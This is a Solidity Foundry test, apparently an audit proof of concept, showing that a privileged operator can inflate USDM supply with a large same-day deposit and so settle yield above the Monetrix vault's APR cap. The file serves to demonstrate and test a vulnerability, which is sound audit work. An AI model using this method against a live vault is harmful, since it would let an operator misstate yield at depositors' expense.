// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/tokens/USDM.sol";
import "../src/core/MonetrixConfig.sol";

contract AuditAgentPoC is SimulatorBase {
    // ATTACK TIMELINE:
    // 1. [Setup] SimulatorBase deploys and initializes all contracts.
    // 2. [T=0] Attacker (operator) gets USDC and deposits a massive amount into the vault to inflate USDM totalSupply.
    // 3. [T=0] In the same block, attacker (operator) calls vault.settle() with a proposedYield that would normally fail Gate 4 (APR cap).
    // 4. [T=0] Because totalSupply is inflated, the cap is inflated, and the settlement succeeds.
    // 5. [Assert] Verify that the settled yield exceeds the organic cap limit.

    function test_exploit() public {
        console.log("=== ENTER test_exploit ===");
        console.log("block.timestamp:", block.timestamp);
        console.log("operator:", operator);
        console.log("address(usdc):", address(usdc));
        console.log("address(vault):", address(vault));
        console.log("address(usdm):", address(usdm));
        console.log("address(config):", address(config));
        console.log("address(accountant):", address(accountant));

        // Setup: give operator some USDC
        uint256 depositAmount = 100_000_000 * 1e6; // 100M USDC
        console.log("depositAmount:", depositAmount);

        console.log("Before deal");
        deal(address(usdc), operator, depositAmount);
        console.log("After deal");

        console.log("Before startPrank");
        vm.startPrank(operator);
        console.log("After startPrank");

        console.log("Before approve");
        usdc.approve(address(vault), depositAmount);
        console.log("After approve");

        // Get initial USDM supply
        console.log("Before initialSupply");
        uint256 initialSupply = usdm.totalSupply();
        console.log("Initial USDM supply:", initialSupply);

        // Deposit to inflate USDM supply
        console.log("Before vault.deposit");
        vault.deposit(depositAmount);
        console.log("After vault.deposit");

        uint256 inflatedSupply = usdm.totalSupply();
        console.log("Inflated USDM supply:", inflatedSupply);
        assertGt(inflatedSupply, initialSupply, "USDM supply should be inflated");

        // Advance time to pass minSettlementInterval
        console.log("Before vm.warp");
        vm.warp(block.timestamp + 1 days);
        console.log("After vm.warp, timestamp:", block.timestamp);

        // Get maxAnnualYieldBps from config
        console.log("Before config.maxAnnualYieldBps");
        uint256 maxBps = config.maxAnnualYieldBps();
        console.log("maxAnnualYieldBps:", maxBps);

        // Calculate a proposed yield that is way above the organic cap but passes the inflated cap
        // The cap is roughly (inflatedSupply * maxBps / 10000) / 365
        uint256 organicCap = (initialSupply * maxBps / 10000) / 365;
        uint256 inflatedCap = (inflatedSupply * maxBps / 10000) / 365;

        uint256 proposedYield = inflatedCap; 
        console.log("Proposed yield:", proposedYield);
        console.log("organicCap:", organicCap);
        console.log("inflatedCap:", inflatedCap);

        // Ensure proposedYield is greater than organicCap
        assertGt(proposedYield, organicCap, "Proposed yield should exceed organic cap");

        // Settle the daily PnL
        // vault.settle calls accountant.settleDailyPnL
        console.log("Before vault.settle");
        vault.settle(proposedYield);
        console.log("After vault.settle");

        // Verify that the yield was settled
        console.log("Before accountant.totalSettledYield");
        uint256 totalSettled = accountant.totalSettledYield();
        console.log("Total settled yield:", totalSettled);

        assertGt(totalSettled, organicCap, "Settled yield should exceed organic cap due to inflated supply");

        console.log("Before stopPrank");
        vm.stopPrank();
        console.log("After stopPrank");
        console.log("=== EXIT test_exploit ===");
    }
}
